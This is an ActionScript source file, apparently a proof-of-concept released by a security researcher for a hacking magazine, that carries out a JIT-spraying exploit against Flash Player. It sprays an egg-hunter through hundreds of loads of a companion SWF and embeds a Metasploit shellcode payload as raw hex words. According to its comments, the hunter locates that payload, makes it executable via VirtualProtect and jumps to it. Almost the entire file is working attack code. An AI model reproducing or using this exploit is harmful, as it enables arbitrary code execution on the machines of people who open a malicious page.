
/*
FrommETaSploit2JIT v 0.9b
by Alexey Sintsov [DSecRG]
http://dsecrg.com

Special release for XAKEP magazine (http://www.xakep.ru)
*/

// Sprayng JIT.swf
// 
// Spraing JIT egg-hunter shellcode
//
// Find shellcode from MetaSploit
// than find address of VirtualProtect, make mem exec and jump
//
//  By Alexey Sintsov
//	dookie@inbox.ru
//	a.sintsov@dsec.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//
package
{
    
	import flash.display.*;
	import flash.net.*;
    import flash.text.TextField;
    import flash.text.TextFieldType;
	import flash.system.Security;
	import flash.utils.*;
	
    public class Loadzz1 extends MovieClip
    {
	
		var MyTextField1:TextField = createTextField(10, 40, 300, 20);
		var childRef:DisplayObject = null;
	
		var val:ByteArray = new ByteArray();
	
		var ic=0;
		var ldInt;
		
		private function createTextField(x:Number, y:Number, width:Number, height:Number):TextField {
            var result:TextField = new TextField();
            result.x = x;
            result.y = y;
            result.width = width;
            result.height = height;
            result.background = true;
            result.border = true;
            addChild(result);
            return result;
        }

	
		function pageLoadEx()
		{
						
		    var ldr = new Loader();
			var url = "jit_egg.swf";
			var urlReq = new URLRequest(url);
            ldr.load(urlReq);
			childRef = addChild(ldr); 
            
			
		}
		function pageLoad()
		{
		    
			for(var z=0;z<600;z++){pageLoadEx();}
			ic=ic+1;
			MyTextField1.text=ic+" - JIT spraying, wait for 4 ...";
			if(ic==4)
				{
					clearInterval(ldInt);
					MyTextField1.text=ic+" - done, wait for sploit...";
				}
		}
		function metaShell() {
		val.endian = Endian.LITTLE_ENDIAN;

		//TAG
		val.writeInt(0x07333531)
		val.writeInt(0x07333531)

		//PAYLOAD
		val.writeInt(0x56b1c929);
		val.writeInt(0xd2bad5da);
		val.writeInt(0xd95ac5c6);
		val.writeInt(0x5ef42474);
		val.writeInt(0x31fcee83);
		val.writeInt(0x56031056);
		val.writeInt(0xa63024c2);
		val.writeInt(0x57bb210a);
		val.writeInt(0xb23552ca);
		val.writeInt(0xb62140fb);
		val.writeInt(0x9a2154a9);
		val.writeInt(0x0f671e41);
		val.writeInt(0x20a052d2);
		val.writeInt(0x0f96d853);
		val.writeInt(0xc316ec64);
		val.writeInt(0x1eeb6ea6);
		val.writeInt(0xd0d250fa);
		val.writeInt(0x0c13900f);
		val.writeInt(0x5accc0ff);
		val.writeInt(0x1e79f4ad);
		val.writeInt(0x14adf46d);
		val.writeInt(0xebc88ecd);
		val.writeInt(0x3bd224b9);
		val.writeInt(0xa39c3211);
		val.writeInt(0xd53d1c1a);
		val.writeInt(0x9c017ecf);
		val.writeInt(0x1ff1b464);
		val.writeInt(0x11fa84ac);
		val.writeInt(0x9dc54b90);
		val.writeInt(0x1901951d);
		val.writeInt(0x5979e0fd);
		val.writeInt(0x23b9f280);
		val.writeInt(0x835c765e);
		val.writeInt(0x35842015);
		val.writeInt(0x394fb7fa);
		val.writeInt(0x5e08bcb7);
		val.writeInt(0x5a231046);
		val.writeInt(0xeae497c3);
		val.writeInt(0xb620b397);
		val.writeInt(0x1271dd4c);
		val.writeInt(0xfa62e223);
		val.writeInt(0xe9e8469c);
		val.writeInt(0x65b3f1c9);
		val.writeInt(0x764bcc3e);
		val.writeInt(0x443f4728);
		val.writeInt(0xe4d7f3f7);
		val.writeInt(0x0a20da70);
		val.writeInt(0xf5bf9aab);
		val.writeInt(0x3196db53);
		val.writeInt(0x90808b07);
		val.writeInt(0x1c514027);
		val.writeInt(0xb201c7f2);
		val.writeInt(0x72f1a7ac);
		val.writeInt(0x7d18401c);
		val.writeInt(0x57237043);
		val.writeInt(0x83edb6f2);
		val.writeInt(0x340c5157);
		val.writeInt(0xd299fd46);
		val.writeInt(0x4dcfed02);
		val.writeInt(0x462bcfba);
		val.writeInt(0xfa1e2f5d);
		val.writeInt(0x1416a7f6);
		val.writeInt(0x32a6c8c0);
		val.writeInt(0xd50e6463);
		val.writeInt(0xc48b66f7);
		val.writeInt(0x8fbba308);
		val.writeInt(0xfe312431);
		val.writeInt(0x2b46d4f0);
		val.writeInt(0xb0d47462);
		val.writeInt(0x6ec5f372);
		val.writeInt(0x673b5425);
		val.writeInt(0xd16248a3);
		val.writeInt(0x1af290d1);
		val.writeInt(0xa5c74f51);
		val.writeInt(0x82730258);
		val.writeInt(0x8e7cda4a);
		val.writeInt(0x582ab23e);
		val.writeInt(0x2a8574e8);
		val.writeInt(0xe57a2f42);
		val.writeInt(0x36b0b602);
		val.writeInt(0xc09cb754);
		val.writeInt(0x954906b8);
		val.writeInt(0x111da7c7);
		val.writeInt(0xdebdd5b0);
		val.writeInt(0x94cd5e6b);
		val.writeInt(0x7146f731);
		val.writeInt(0x820b45a0);
		val.writeInt(0x0132891f);
		val.writeInt(0x19c17295);
		val.writeInt(0x9d8d77dc);
		val.writeInt(0x4b9e0a0d);
		val.writeInt(0x599fb931);


			}
 

		function Loadzz1()
		{
		    
           Security.allowDomain("*");
			MyTextField1.type = TextFieldType.DYNAMIC;
			
			
			metaShell();
			ldInt=setInterval(pageLoad,2000);
			    
		}
    }
}
